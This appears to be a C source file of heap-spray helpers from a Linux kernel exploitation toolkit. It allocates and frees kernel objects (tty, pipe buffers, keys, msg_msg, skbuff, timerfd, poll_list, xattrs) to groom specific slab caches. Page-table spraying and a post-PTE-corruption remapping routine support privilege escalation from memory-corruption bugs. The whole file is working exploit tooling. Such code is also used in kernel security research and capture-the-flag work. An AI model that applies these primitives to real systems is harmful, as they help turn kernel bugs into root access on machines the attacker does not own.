#define _GNU_SOURCE
#include "spray.h"
#include "../util/util.h"
#include <attr/xattr.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <time.h>
#include <unistd.h>

int g_pipes[0x1000][0x2];
int g_socks[0x1000][0x2];
int g_qids[0x1000];
int g_keys[0x1000];
int g_seq_ops[0x10000];
int g_ptmx[0x1000];
int g_fds[0x1000];
int g_tfds[0x1000];
pthread_t g_poll_tids[0x1000];
int g_n_keys;

static int poll_threads;
static pthread_mutex_t poll_mutex = PTHREAD_MUTEX_INITIALIZER;

// kmalloc-1k
void alloc_tty(int i) {
    g_ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (g_ptmx[i] < 0) {
        errExit("[X] alloc_tty");
    }
}

void free_tty(int i) {
    if (close(g_ptmx[i]) < 0) {
        errExit("[X] free tty");
    }
}

// used to be be kmalloc-1k, now kmalloc-cg-1k
void alloc_pipe_buf(int i) {
    if (pipe(g_pipes[i]) < 0) {
        errExit("alloc_pipe_buf");
        return;
    }
}

void release_pipe_buf(int i) {
    if (close(g_pipes[i][0]) < 0) {
        errExit("release_pipe_buf");
    }

    if (close(g_pipes[i][1]) < 0) {
        errExit("release_pipe_buf");
    }
}

static long keyctl(int operation, unsigned long arg2, unsigned long arg3,
                   unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

static inline key_serial_t add_key(const char *type, const char *description,
                                   const void *payload, size_t plen,
                                   key_serial_t ringid) {
    long ret = syscall(__NR_add_key, type, description, payload, plen, ringid);
    if (ret < 0) {
        errExit("add_key");
    }

    return ret;
}

// revoke -> RCU grace period -> callback -> ordinary kfree -> normal sheaf
long free_key(int id) {
    key_serial_t key = g_keys[id];
    long ret = keyctl(KEYCTL_REVOKE, key, 0, 0, 0);

    if (ret < 0) {
        errExit("free_key (keyctl_revoke)");
    }

    ret = keyctl(KEYCTL_UNLINK, key, KEY_SPEC_PROCESS_KEYRING, 0, 0);

    if (ret < 0) {
        errExit("free_key (keyctl_unlink)");
    }

    return ret;
}

long get_key(int i, char *buf, size_t sz) {
    long ret = keyctl(KEYCTL_READ, g_keys[i], (uint64_t)buf, sz, 0);
    if (ret < 0) {
        errExit("keyctl read");
    }

    return ret;
}

// `kmalloc-32 -kmalloc-4096?`
void alloc_key(int id, char *buf, size_t size) {
    char desc[0x400] = {0};
    char payload[0x1000] = {0};
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    if (!buf) {
        memset(payload, 0x41, size);
    } else {
        memcpy(payload, buf, size);
    }

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0) {
        errExit("add_key");
    }

    g_keys[id] = key;
}

void alloc_qid(int i) {
    g_qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (g_qids[i] < 0) {
        errExit("[X] msgget");
    }
}

// sizeof(struct skb_shared_info) == 0x140
#define SKB_SHARED_INFO_SIZE 0x140

// elastic object, kmalloc-cg-* caches ?
// 0x200 lands in kmalloc-cg-512
// skbuff.h
void alloc_skbuff_sock(int i) {
    int ret = socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i]);
    if (ret < 0) {
        errExit("init skbuff failed");
    }
}

void free_skbuff_sock(int i) {
    if (close(g_socks[i][0]) < 0) {
        errExit("release_pipe_buf");
    }

    if (close(g_socks[i][1]) < 0) {
        errExit("release_pipe_buf");
    }
}

void write_skbuff(int idx, char *buf, size_t size) {
    if (size < SKB_SHARED_INFO_SIZE) {
        errExit("skbuff needs to be at least SKB_SHARED_INFO_SIZE big");
    }
    int ret = write(g_socks[idx][0], buf, size);
    if (ret < 0) {
        errExit("skbuff write");
    }
}

void read_skbuff(int idx, char *buf, size_t size) {
    int ret = read(g_socks[idx][1], buf, size);
    if (ret < 0) {
        errExit("skbuff write");
    }
}

void send_msg(int qid, int c, int size, long type) {
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SIZE) {
        off += sizeof(msg_msg_seg_t);
    }

    struct msgbuf {
        long mtype;
        char mtext[size - off];
    } msg;

    if (!type) {
        msg.mtype = 0xffff;
    } else {
        msg.mtype = type;
    }

    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0) {
        errExit("msgsnd");
    }
}

void send_msg_payload(int qid, char *buf, int size, long type) {
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SIZE) {
        off += sizeof(msg_msg_seg_t);
    }

    struct msgbuf {
        long mtype;
        char mtext[size - off];
    } msg;

    memcpy(msg.mtext, buf, sizeof(msg.mtext));

    if (!type) {
        msg.mtype = 0xffff;
    } else {
        msg.mtype = type;
    }

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0) {
        errExit("msgsnd");
    }
}

long recv_msg(int qid, void *data, int size, long type, bool copy) {
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SIZE) {
        off += sizeof(msg_msg_seg_t);
    }
    int ret;
    struct msg_buf {
        long mtype;
        char mtext[size - off];
    } msg;

    if (copy) {
        ret = msgrcv(qid, &msg, size - off, type, IPC_NOWAIT | MSG_COPY);
    } else {
        ret = msgrcv(qid, &msg, size - off, type, IPC_NOWAIT | MSG_NOERROR);
    }

    memcpy(data, msg.mtext, sizeof(msg.mtext));

    if (ret < 0) {
        errExit("msgrcv");
    }

    return msg.mtype;
}

// kmalloc-256
// timerfd_ctx` struct defined in `timerfd.c`
void alloc_timer(int i) {
    struct itimerspec its;

    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 0;
    its.it_value.tv_sec = 2;
    its.it_value.tv_nsec = 0;

    g_tfds[i] = timerfd_create(CLOCK_REALTIME, 0);
    if (g_tfds[i] < 0) {
        errExit("[X] timerfd_create failed for: %d", i);
    }
}

// uses kfree_rcu() so need to sleep shortly to ensure RCU race period has
// elapsed
void free_timer(int i) {
    int ret = close(g_tfds[i]);
    if (ret < 0) {
        errExit("failed to free timer with fd: %d", i);
    }
}

void alloc_file(int i) {
    g_fds[i] = open("/etc/passwd", O_RDONLY);

    if (g_fds[i] < 1) {
        errExit("[X] init_fd failed for: %d", i);
    }
}

void free_file(int i) {
    int ret = close(g_fds[i]);
    if (ret < 0) {
        errExit("failed to free file with fd: %d", i);
    }
}

static int randint(int min, int max) { return min + (rand() % (max - min)); }

unsigned poll_fds_to_alloc(size_t sz) {
    // stuff allocated on stack (inside stack_pps buf)
    unsigned to_alloc =
        (STACK_PPS_SZ - sizeof(poll_list_t)) / sizeof(struct pollfd);

    // subtract size needed for poll_list struct
    if (sz % PAGE_SIZE == 0) {
        sz -= sz / PAGE_SIZE * sizeof(poll_list_t);
    } else {
        sz -= (sz / PAGE_SIZE + 1) * sizeof(poll_list_t);
    }

    to_alloc += sz / sizeof(struct pollfd);

    return to_alloc;
}

void *spray_poll_list(void *args) {
    thread_args_t *ta = (thread_args_t *)args;
    int ret;

    struct pollfd *pollers = calloc(ta->amt, sizeof(struct pollfd));

    for (unsigned i = 0; i < ta->amt; i++) {
        pollers[i].fd = ta->fd_read;
        pollers[i].events = POLLERR;
    }

    assign_thread_to_core(0x0);

    pthread_mutex_lock(&poll_mutex);
    poll_threads++;
    pthread_mutex_unlock(&poll_mutex);

    ret = poll(pollers, ta->amt, ta->timeout);
    if (ret < 0) {
        errExit("poll");
    }

    assign_thread_to_core(randint(0x1, 0x3));

    if (ta->suspend) {
        pthread_mutex_lock(&poll_mutex);
        poll_threads--;
        pthread_mutex_unlock(&poll_mutex);

        while (1) {
        };
    }

    return NULL;
}

void create_poll_thread(int i, thread_args_t *args) {
    int ret;

    ret = pthread_create(&g_poll_tids[i], 0, spray_poll_list, (void *)args);
    if (ret != 0) {
        errExit("pthread_create");
    }
}

void join_poll_threads(void) {
    int ret;
    for (int i = 0; i < poll_threads; i++) {
        ret = pthread_join(g_poll_tids[i], NULL);

        if (ret < 0) {
            errExit("pthread_join");
        }
        open("/proc/self/stat", O_RDONLY);
    }
    poll_threads = 0x0;
}

// TODO: need to check this for the specific kernel. struct has changed quite
// often
#define XATTR_META_SIZE 0x20
// max value size
#define XATTR_SIZE_MAX 65536
// max name size
#define XATTR_NAME_MAX 255

static void make_xattr_name(char name[XATTR_NAME_MAX + 1], int i,
                            size_t name_len) {
    const size_t prefix_len = strlen("security.");

    if (i < 0 || name_len <= prefix_len || name_len > XATTR_NAME_MAX) {
        errExit("bad xattr name parameters");
    }

    int width = name_len - prefix_len;
    int ret = snprintf(name, XATTR_NAME_MAX + 1, "security.%0*d", width, i);

    if (ret < 0 || (size_t)ret != name_len)
        errExit("xattr name length mismatch");
}
// elastic object, that triggers two allocations: value and name
// both allocations use GFP_KERNEL_ACCOUNT, so will land in cg caches
//
// - value allocation via kvmalloc
// https://github.com/torvalds/linux/blob/acb7500801e98639f6d8c2d796ed9f64cba83d3a/fs/xattr.c#L1259-L1265
// - name allocation via kstrdup:
// https://github.com/torvalds/linux/blob/acb7500801e98639f6d8c2d796ed9f64cba83d3a/fs/xattr.c#L1377
void alloc_xattr_fd(int fd, int i, void *val, size_t val_size,
                    size_t name_len) {
    char name[XATTR_NAME_MAX + 1] = {0};
    int ret;

    if (val_size < XATTR_META_SIZE ||
        val_size - XATTR_META_SIZE > XATTR_SIZE_MAX) {
        errExit("invalid value allocation size");
    }

    val_size -= XATTR_META_SIZE;

    make_xattr_name(name, i, name_len);

    ret = fsetxattr(fd, name, val, val_size, XATTR_CREATE);
    if (ret < 0) {
        errExit("fsetxattr");
    }
}

void free_xattr_fd(int fd, int i, size_t name_len) {
    char name[XATTR_NAME_MAX + 1] = {0};
    make_xattr_name(name, i, name_len);

    int res = fremovexattr(fd, name);
    if (res < 0) {
        perror("fremovexattr");
    }
}

void alloc_xattr(char *path, int i, void *data, size_t val_size,
                 size_t name_len) {
    char name[XATTR_NAME_MAX + 1] = {0};
    int ret;

    if (val_size < XATTR_META_SIZE ||
        val_size - XATTR_META_SIZE > XATTR_SIZE_MAX) {
        errExit("invalid value allocation size");
    }

    val_size -= XATTR_META_SIZE;

    make_xattr_name(name, i, name_len);

    // TODO: XATTR_REPLACE ?
    ret = setxattr(path, name, data, val_size, XATTR_CREATE);
    if (ret < 0) {
        errExit("alloc_simple_xattr failed");
    }
}

void free_xattr(char *path, int i, size_t name_len) {
    char name[XATTR_NAME_MAX + 1] = {0};

    make_xattr_name(name, i, name_len);

    if (removexattr(path, name) < 0) {
        errExit("free_xattr");
    }
}

// spray file backed page tables
void spray_pt_fd(unsigned start, unsigned len, int fd) {
    for (unsigned i = start; i < start + len; ++i) {
        uint64_t *p = mmap(PTI_TO_VIRT(3, 0, i, 0), PAGE_SIZE, PROT_READ,
                           MAP_SHARED | MAP_FIXED, fd, 0);
        if (p == MAP_FAILED) {
            errExit("mmap failed");
        }

        volatile uint64_t touch = *p;
    }
}

// spray anonymous page tables
// jump in pmd-sized strides to ensure each loop allocates a new page table
void spray_pt(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        uint64_t *p = mmap(PTI_TO_VIRT(3, 0, i, 0), PAGE_SIZE, PROT_READ,
                           MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED, -1, 0);
        if (p == MAP_FAILED) {
            errExit("mmap failed");
        }

        volatile uint64_t touch = *p;
    }
}

void unspray_pt(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        int ret = munmap(PTI_TO_VIRT(3, 0, i, 0), PAGE_SIZE);
        if (ret < 0) {
            errExit("munmap");
        }
    }
}

// after corrupting PTE: use mremap to force invalidation of the original
// mapping and remapped region to have the corrupted permissions.
//
// Adjust function based on which PTE you are targeting.
//  + E.g. if you have control over a field at offset 0x18, then need to specify
//  `3` instead of `0`
void invalidate_pt_spray_mappings(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        void *src = PTI_TO_VIRT(3, 0, i, 0);
        void *dst = PTI_TO_VIRT(4, 0, i, 0);
        void *moved = mremap(src, PAGE_SIZE, PAGE_SIZE,
                             MREMAP_MAYMOVE | MREMAP_FIXED, dst);

        if (moved == MAP_FAILED) {
            errExit("mremap failed for i=%u", i);
        }
        if (moved != dst) {
            errExit("mremap returned unexpected address");
        }
    }
}
